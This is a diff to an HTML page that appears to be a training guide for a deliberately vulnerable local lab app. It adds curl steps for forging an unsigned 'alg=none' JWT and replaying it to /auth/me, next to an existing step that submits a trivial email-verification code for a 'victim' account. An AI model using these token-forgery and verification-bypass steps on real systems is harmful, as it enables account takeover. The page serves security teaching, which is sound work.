@@ -64,7 +64,11 @@ curl -s -X POST http://localhost:3001/api/v1/auth/verify-email \
   -H "content-type: application/json" \
   -d "{\"email\":\"victim@nexatech.local\",\"code\":\"000000\"}"
 
-curl -s http://localhost:3001/lab/jwt-alg-none</pre>
+# SC-70: forge alg=none JWT then call /auth/me (replace USER_ID)
+curl -s "http://localhost:3001/lab/jwt-alg-none?sub=USER_ID"
+# Use sampleUnsignedJwt from response:
+curl -s http://localhost:3001/api/v1/auth/me \
+  -H "Authorization: Bearer SAMPLE_UNSIGNED_JWT"</pre>
     </div>
 
     <div class="card" id="api3">
